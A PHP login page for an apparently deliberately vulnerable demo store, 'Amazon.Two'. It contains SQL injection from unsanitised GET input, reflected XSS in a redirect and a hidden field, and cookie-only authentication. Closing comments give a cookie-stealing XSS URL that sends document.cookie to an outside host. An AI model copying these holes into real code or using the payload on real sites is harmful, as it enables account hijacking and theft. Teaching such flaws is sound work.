<?php
include("config.php");
include("header.php");
//phpinfo();
//print_r($_GET);
if (isset($_COOKIE["email"])) {
	?>	
		Redirecting you to store...
		<script>top.location.href="http://amazon.two/";</script>
	<?php
} else {
	$suc = 0;

	//process signin
	if (isset($_GET["email"])  && isset($_GET["password"]) && isset($_GET["submitlogin"])) {

		//no input sanitisation big vulnerability
		//no check for blank input
		$qc = "SELECT * FROM users WHERE email = '".$_GET["email"]."' AND passwd = '".$_GET["password"]."'";
		$rc = mysql_query($qc);
		if (mysql_num_rows($rc) == 1) {
			$suc = 1;
			setcookie("email",$_GET["email"]);
			?>
				Login successful. Redirecting to product page...
				<script>top.location.href="http://amazon.two/product.php?product=<?= $_GET['next'] ?>";</script>
			<?php
		} else {
			$suc = 2;
		}

	}

	if ($suc == 2) { ?>

		<div style="border: 1px solid #C9C9C9; width: 300px; padding: 5px 10px; margin: 10px 0 10px 0; font-size: 12px; font-weight: bold;">
		Invalid Username or Password
		</div>

	<?php } ?>

	<?php if ($suc == 0 || $suc == 2) { ?>

		Sign into your Amazon.Two account<br /><br />
		<form action="user.php" method="GET">
			<input type="text" name="email" placeholder="Enter Email" /><br />
			<input type="password" name="password" placeholder="Enter Password" /><br /><br />
			<input type="hidden" name="next" value="<?= $_GET['next'] ?>" />
			<input type="submit" name="submitlogin" value="Sign In" />
		</form>	

	<?php } ?>

	<?php

}


?>

<?php 
	include("footer.php"); 
?>

<!-- Chrome has AntiXSS filter so cool - http://blog.securitee.org/?p=37 -->
<!-- Steal cookies using XSS -->
<!-- http://amazon.two/product.php?product=%3Cscript%3Enew%20Image%28%29.src=%22http://google.com%22%3C/script%3E-->
<!-- http://amazon.two/product.php?product=<script>new Image().src="http://good.site/iamgood/showimage.php?param="+document.cookie</script> -->
<!-- html injection vulnerability for breadcrumb -->
<!-- python script to demonstrate CSRF vulnerability-->